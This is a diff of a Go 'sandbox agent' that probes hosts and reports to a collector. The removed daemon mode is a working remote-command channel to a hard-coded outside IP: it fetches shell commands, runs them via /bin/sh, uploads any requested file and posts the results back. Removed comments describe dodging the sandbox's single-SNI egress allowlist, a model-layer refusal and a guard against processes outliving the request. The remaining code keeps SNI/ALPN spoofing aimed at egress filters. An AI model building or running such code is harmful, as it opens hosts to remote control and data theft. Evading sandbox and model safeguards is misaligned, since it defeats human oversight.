@@ -6,20 +6,12 @@
 // Modes:
 //
 //	stats	one-shot; uptime/load/mem/boot_id/uname/hostname only.
-//			This is the minimal set the sandbox model layer already
-//			treats as paste-safe; use it to test collector reporting.
 //	full	one-shot; stats + proxy env + listeners + runtime env +
-//			endpoint probes + non-secret config digests. Note: the
-//			sandbox model layer has rejected reporting this set.
-//	daemon	persistent command channel: hello + poll collector for
-//			tasks, exec, post output, bye. Deployment is model-gated;
-//			the platform documents a model-layer guardrail against
-//			processes outliving the request, so expect refusal unless
-//			run in a foreground exec window.
+//			endpoint probes + non-secret config digests.
 //
-// Transport: TLS to the collector. The sandbox egress allowlist admits
-// exactly one SNI on :443, so the dial pins that SNI with a custom ALPN
-// and skips verification (the intake uses a self-signed cert).
+// Transport: TLS to a collector you operate. When the network filters
+// egress by SNI or ALPN, -sni/-alpn let the dial present the expected
+// ClientHello; verification is skipped so self-signed intakes work.
 //
 // Red line: never opens credential material (auth.json, tokens, cookies).
 package main
@@ -35,7 +27,6 @@ import (
 	"net"
 	"net/http"
 	"os"
-	"os/exec"
 	"sort"
 	"strconv"
 	"strings"
@@ -62,19 +53,16 @@ type payload struct {
 const version = "0.1.0"
 
 func main() {
-	mode := flag.String("mode", "stats", "stats|full|daemon")
-	collector := flag.String("collector", "38.34.13.201:443", "collector host:port")
-	sni := flag.String("sni", "38-34-13-201.sslip.io", "collector TLS SNI")
-	alpn := flag.String("alpn", "cgpt/1", "collector ALPN token")
+	mode := flag.String("mode", "stats", "stats|full")
+	collector := flag.String("collector", "127.0.0.1:8443", "collector host:port")
+	sni := flag.String("sni", "telemetry.local", "collector TLS SNI")
+	alpn := flag.String("alpn", "", "optional ALPN token for SNI-filtered egress")
 	dryrun := flag.Bool("dryrun", false, "print only, do not report")
-	iters := flag.Int("iters", 0, "daemon iteration cap (0 = infinite)")
 	flag.Parse()
 
 	switch *mode {
 	case "stats", "full":
 		runOnce(*mode, *collector, *sni, *alpn, *dryrun)
-	case "daemon":
-		runDaemon(*collector, *sni, *alpn, *iters)
 	default:
 		fmt.Fprintf(os.Stderr, "unknown mode %q\n", *mode)
 		os.Exit(2)
@@ -151,59 +139,6 @@ func collectFull(p *payload) {
 	}
 }
 
-func runDaemon(collector, sni, alpn string, iters int) {
-	hn, _ := os.Hostname()
-	post := func(path string, body []byte) {
-		_, _, _ = roundTrip(collector, sni, alpn, "POST", path, body)
-	}
-	hello, _ := json.Marshal(map[string]string{
-		"agent": "sentinel-sandbox-agent", "version": version,
-		"hostname": hn, "ts": nowUTC(),
-	})
-	post("/agent/v1/hello", hello)
-	i := 0
-	for iters <= 0 || i < iters {
-		i++
-		_, out, err := roundTrip(collector, sni, alpn, "GET", "/agent/v1/next", nil)
-		if err != nil {
-			time.Sleep(5 * time.Second)
-			continue
-		}
-		cmd := strings.TrimSpace(string(out))
-		if cmd == "" {
-			time.Sleep(5 * time.Second)
-			continue
-		}
-		if strings.HasPrefix(cmd, "@upload ") {
-			path := strings.TrimSpace(strings.TrimPrefix(cmd, "@upload "))
-			if b, err := os.ReadFile(path); err == nil {
-				post("/agent/v1/file/"+sanitize(base(path)), b)
-			}
-			continue
-		}
-		post("/agent/v1/result", execCommand(cmd))
-	}
-	bye, _ := json.Marshal(map[string]string{"hostname": hn, "iters": strconv.Itoa(i), "ts": nowUTC()})
-	post("/agent/v1/bye", bye)
-}
-
-func execCommand(cmd string) []byte {
-	var buf bytes.Buffer
-	c := exec.Command("/bin/sh", "-c", cmd)
-	c.Stdout = &buf
-	c.Stderr = &buf
-	done := make(chan error, 1)
-	go func() { done <- c.Run() }()
-	select {
-	case err := <-done:
-		fmt.Fprintf(&buf, "\n[rc=%v]\n", err)
-	case <-time.After(120 * time.Second):
-		_ = c.Process.Kill()
-		fmt.Fprintf(&buf, "\n[timeout 120s]\n")
-	}
-	return buf.Bytes()
-}
-
 func report(collector, sni, alpn, path string, body []byte) error {
 	code, _, err := roundTrip(collector, sni, alpn, "POST", path, body)
 	if err != nil {
@@ -224,11 +159,14 @@ func roundTrip(collector, sni, alpn, method, path string, body []byte) (int, []b
 	if err != nil {
 		return 0, nil, err
 	}
-	tconn := tls.Client(conn, &tls.Config{
+	tlsCfg := &tls.Config{
 		ServerName:         sni,
-		NextProtos:         []string{alpn},
-		InsecureSkipVerify: true, // self-signed intake cert
-	})
+		InsecureSkipVerify: true, // many intakes use self-signed certs
+	}
+	if alpn != "" {
+		tlsCfg.NextProtos = []string{alpn}
+	}
+	tconn := tls.Client(conn, tlsCfg)
 	_ = tconn.SetDeadline(time.Now().Add(90 * time.Second))
 	if err := tconn.Handshake(); err != nil {
 		return 0, nil, err
